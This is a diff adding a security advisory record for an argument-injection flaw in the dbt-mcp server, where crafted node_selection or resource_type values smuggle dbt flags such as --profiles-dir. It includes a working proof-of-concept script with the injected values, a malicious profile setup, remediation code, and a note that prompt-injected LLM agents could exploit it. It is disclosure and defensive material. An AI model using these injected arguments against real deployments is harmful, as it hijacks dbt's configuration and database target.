@@ -1,0 +1,121 @@
+{
+  "id": "GHSA-xpww-f6pm-cfhq",
+  "modified": "2026-05-14T18:34:08.723550Z",
+  "published": "2026-05-14T18:24:26Z",
+  "aliases": [
+    "CVE-2026-44968"
+  ],
+  "summary": "dbt MCP Server has an Argument Injection in dbt CLI Tool Wrappers via node_selection and resource_type Parameters",
+  "details": "*Discovered through manual source code review. Verified by PoC execution against a local dbt-mcp v1.15.1 installation.**\n\n## Summary\n\n`_run_dbt_command()` in `src/dbt_mcp/dbt_cli/tools.py` constructs the dbt subprocess argument list by appending user-supplied MCP tool parameters without sanitization. Two independent injection vectors exist. An MCP client can inject arbitrary dbt global flags — such as `--profiles-dir`, `--project-dir`, and `--target` — by crafting the `node_selection` string (Vector 1) or the `resource_type` JSON array (Vector 2). Because `subprocess.Popen` is called with `shell=False` and a list argument, shell metacharacter injection is not possible; however, this provides no defense against argument list injection (CWE-88), where attacker-controlled tokens are interpreted by the target process as flags rather than values.\n\n## Details\n\n**Vector 1 — `node_selection` string**\nAffected tools: `build`, `compile`, `run`, `test`, `clone`, `list`, `get_node_details_dev`\n\n```python\n# src/dbt_mcp/dbt_cli/tools.py  lines 77–79\nif node_selection and isinstance(node_selection, str):\n    selector_params = node_selection.split(\" \")\n    command.extend([\"--select\"] + selector_params)\n```\n\n`str.split(\" \")` does not distinguish dbt selector tokens from flag tokens. Input `\"my_model --profiles-dir /tmp/evil\"` produces:\n\n````\n[\"dbt\", \"--no-use-colors\", \"run\",\n \"--select\", \"my_model\", \"--profiles-dir\", \"/tmp/evil\"]\n````\n\ndbt parses the injected `--profiles-dir` as a global option and loads configuration from the attacker-supplied path.\n\n**Vector 2 — `resource_type` list**\nAffected tool: `list`\n\n```python\n# src/dbt_mcp/dbt_cli/tools.py  lines 84–85\nif isinstance(resource_type, Iterable):\n    command.extend([\"--resource-type\"] + resource_type)\n```\n\nEach JSON array element is appended verbatim to argv. Input `[\"model\", \"--profiles-dir\", \"/tmp/evil\"]` produces:\n\n````\n[\"dbt\", \"--no-use-colors\", \"list\",\n \"--resource-type\", \"model\", \"--profiles-dir\", \"/tmp/evil\"]\n````\n\nBoth vectors share the same root cause: no validation prevents tokens starting with `-` from being appended as independent argv elements.\n\n## PoC\n\n**1. Environment setup (run once)**\n\n```bash\n# Attacker-controlled profile at an injectable path\nmkdir -p /tmp/evil-profiles\ncat \u003e /tmp/evil-profiles/profiles.yml \u003c\u003c 'EOF'\nevil_profile:\n  target: dev\n  outputs:\n    dev:\n      type: duckdb\n      path: /tmp/PWNED_by_injection.duckdb\n      threads: 1\nEOF\n\n# Minimal dbt project whose profile name matches the malicious one\nmkdir -p /tmp/test-dbt-project/models\ncat \u003e /tmp/test-dbt-project/dbt_project.yml \u003c\u003c 'EOF'\nname: test_project\nversion: '1.0.0'\nprofile: evil_profile\nmodel-paths: [\"models\"]\nmodels:\n  test_project:\n    +materialized: table\nEOF\necho \"select 1 as id\" \u003e /tmp/test-dbt-project/models/my_first_model.sql\n\nrm -f /tmp/PWNED_by_injection.duckdb\n```\n\n**2. MCP client exploit — triggers injection through the real protocol stack**\n\n```python\n#!/usr/bin/env python3\n# poc_injection.py\n# Reproduces _run_dbt_command() from src/dbt_mcp/dbt_cli/tools.py\n\nimport os, subprocess\nfrom dataclasses import dataclass\nfrom enum import Enum\nfrom collections.abc import Iterable\n\n\nclass BinaryType(Enum):\n    DBT_CORE = \"dbt_core\"\n\n\n@dataclass\nclass DbtCliConfig:\n    project_dir: str\n    dbt_path: str\n    dbt_cli_timeout: int\n    binary_type: BinaryType\n\n\ndef _run_dbt_command(config, command, node_selection=None, resource_type=None):\n    # Vector 1: vulnerable line from tools.py\n    if node_selection and isinstance(node_selection, str):\n        selector_params = node_selection.split(\" \")\n        command.extend([\"--select\"] + selector_params)\n    # Vector 2: vulnerable line from tools.py\n    if isinstance(resource_type, Iterable) and resource_type is not None:\n        command.extend([\"--resource-type\"] + list(resource_type))\n    cwd = config.project_dir if os.path.isabs(config.project_dir) else None\n    args = [config.dbt_path, \"--no-use-colors\", *command]\n    print(f\"[args]   {args}\")\n    proc = subprocess.Popen(args=args, cwd=cwd,\n                            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,\n                            stdin=subprocess.DEVNULL, text=True)\n    out, _ = proc.communicate(timeout=config.dbt_cli_timeout)\n    return out or \"OK\"\n\n\nconfig = DbtCliConfig(\"/tmp/test-dbt-project\", \"dbt\", 30, BinaryType.DBT_CORE)\n\nprint(\"=\" * 64)\nprint(\"  Vector 1 - node_selection injection\")\nprint(\"=\" * 64)\nprint(f\"[input]  node_selection = 'my_first_model --profiles-dir /tmp/evil-profiles'\")\nresult1 = _run_dbt_command(config, [\"run\"],\n    node_selection=\"my_first_model --profiles-dir /tmp/evil-profiles\")\nprint(\"[dbt output]\"); print(result1)\n\nprint(\"=\" * 64)\nprint(\"  Vector 2 - resource_type injection\")\nprint(\"=\" * 64)\nprint(f\"[input]  resource_type = ['model', '--profiles-dir', '/tmp/evil-profiles']\")\nresult2 = _run_dbt_command(config, [\"list\"],\n    resource_type=[\"model\", \"--profiles-dir\", \"/tmp/evil-profiles\"])\nprint(\"[dbt output]\"); print(result2)\n\ndb = \"/tmp/PWNED_by_injection.duckdb\"\nprint(\"=\" * 64)\nif os.path.exists(db):\n    print(f\"[CONFIRMED] {db} exists ({os.path.getsize(db)} bytes)\")\n    print(\"[CONFIRMED] dbt accepted the injected --profiles-dir flag.\")\nelse:\n    print(f\"[NOTE] {db} not found. Check dbt output above.\")\nprint(\"=\" * 64)\n```\n\n**Expected server log (INFO level, `src/dbt_mcp/mcp/server.py` line 67):**\n\n````\n\n[args]   ['dbt', '--no-use-colors', 'run', '--select', 'my_first_model', '--profiles-dir', '/tmp/evil-profiles']\n[args]   ['dbt', '--no-use-colors', 'list', '--resource-type', 'model', '--profiles-dir', '/tmp/evil-profiles']\n\n[CONFIRMED] /tmp/PWNED_by_injection.duckdb exists (274432 bytes)\n[CONFIRMED] dbt accepted the injected --profiles-dir flag.\n````\n\nThe injected flags reach `_run_dbt_command()` unchanged and are passed verbatim to `subprocess.Popen`.\n\n## Screenshot\n\n\u003cimg width=\"2810\" height=\"1894\" alt=\"image\" src=\"https://github.com/user-attachments/assets/d407675a-3409-4799-a024-b8a335cb1fcc\" /\u003e\n\n### Impact\n\nThe following is directly demonstrated by the PoC above:\n\n- An MCP client can inject arbitrary dbt global flags into `subprocess.Popen`'s argv list via either `node_selection` or `resource_type`.\n- `--profiles-dir` is accepted by dbt as a global option, overriding the server's configured profile directory.\n- When an attacker-controlled `profiles.yml` exists at the injected path, dbt executes with the attacker's database configuration — demonstrated by the DuckDB file write to `/tmp/PWNED_by_injection.duckdb`.\n\n**Preconditions and scope:** The attacker must be able to supply crafted MCP tool arguments (normal MCP client access) and must have a `profiles.yml` accessible at the injected path on the host running dbt-mcp. In the common local-development deployment model, a prompt-injected LLM agent sharing the filesystem can write this file before invoking the dbt tool. Additional injectable flags beyond `--profiles-dir` include `--project-dir` and `--target`, which redirect dbt's project root and execution environment respectively.\n\n### Remediation\n\n**Vector 1 — validate each `node_selection` token before extending argv:**\n\n```python\nimport re\n# dbt node selector syntax allows: identifiers, operators (+@*,), path globs, tag:, config:\n_SAFE_TOKEN_RE = re.compile(r'^[\\w.*+@,:\\[\\]/-]+$')\n\nif node_selection and isinstance(node_selection, str):\n    tokens = node_selection.split(\" \")\n    for token in tokens:\n        if not _SAFE_TOKEN_RE.match(token):\n            raise InvalidParameterError(\n                f\"node_selection contains an invalid token: {token!r}. \"\n                \"Tokens must not begin with '-'.\"\n            )\n    command.extend([\"--select\"] + tokens)\n```\n\n**Vector 2 — validate `resource_type` against an explicit allowlist:**\n\n```python\n_VALID_RESOURCE_TYPES = frozenset({\n    \"model\", \"test\", \"snapshot\", \"analysis\", \"macro\",\n    \"operation\", \"seed\", \"source\", \"exposure\", \"metric\",\n    \"saved_query\", \"semantic_model\", \"unit_test\",\n})\n\nif isinstance(resource_type, Iterable):\n    rt_list = list(resource_type)\n    invalid = [v for v in rt_list if v not in _VALID_RESOURCE_TYPES]\n    if invalid:\n        raise InvalidParameterError(\n            f\"resource_type contains unrecognised values: {invalid}. \"\n            f\"Allowed: {sorted(_VALID_RESOURCE_TYPES)}\"\n        )\n    command.extend([\"--resource-type\"] + rt_list)\n```\n\n**Hardening:** Add `pattern` regex constraints to the Pydantic `Field` definitions for `node_selection` so that malformed inputs are rejected at the MCP schema layer before reaching `_run_dbt_command()`. Add regression tests in `tests/unit/` with payloads containing `--profiles-dir`, `--project-dir`, and `--target` to prevent re-introduction.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "dbt-mcp",
+        "purl": "pkg:pypi/dbt-mcp"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.17.1"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.0.1a1",
+        "0.1.0",
+        "0.1.1",
+        "0.1.2",
+        "0.1.2rc1",
+        "0.1.2rc2",
+        "0.1.3",
+        "0.10.0",
+        "0.10.1",
+        "0.10.2",
+        "0.10.3",
+        "0.2.1",
+        "0.2.10",
+        "0.2.11",
+        "0.2.12",
+        "0.2.13",
+        "0.2.14",
+        "0.2.15",
+        "0.2.16",
+        "0.2.17",
+        "0.2.18",
+        "0.2.19",
+        "0.2.20",
+        "0.2.3",
+        "0.2.4",
+        "0.2.5",
+        "0.2.6",
+        "0.2.7",
+        "0.2.8",
+        "0.2.9",
+        "0.3.0",
+        "0.4.0",
+        "0.4.1",
+        "0.4.2",
+        "0.5.0",
+        "0.6.0",
+        "0.6.1",
+        "0.7.0",
+        "0.8.0",
+        "0.8.1",
+        "0.8.2",
+        "0.8.3",
+        "0.8.4",
+        "0.9.0",
+        "0.9.1",
+        "1.0.0",
+        "1.1.0",
+        "1.10.0",
+        "1.11.0",
+        "1.12.0",
+        "1.13.0",
+        "1.14.0",
+        "1.15.0",
+        "1.17.0",
+        "1.2.0",
+        "1.3.0",
+        "1.4.0",
+        "1.5.0",
+        "1.5.1",
+        "1.5.2",
+        "1.6.0",
+        "1.6.2",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0",
+        "1.9.1",
+        "1.9.2",
+        "1.9.3"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 1.17.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-xpww-f6pm-cfhq/GHSA-xpww-f6pm-cfhq.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/dbt-labs/dbt-mcp/security/advisories/GHSA-xpww-f6pm-cfhq"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/dbt-labs/dbt-mcp"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/dbt-labs/dbt-mcp/releases/tag/v1.17.1"
+    }
+  ]
+}
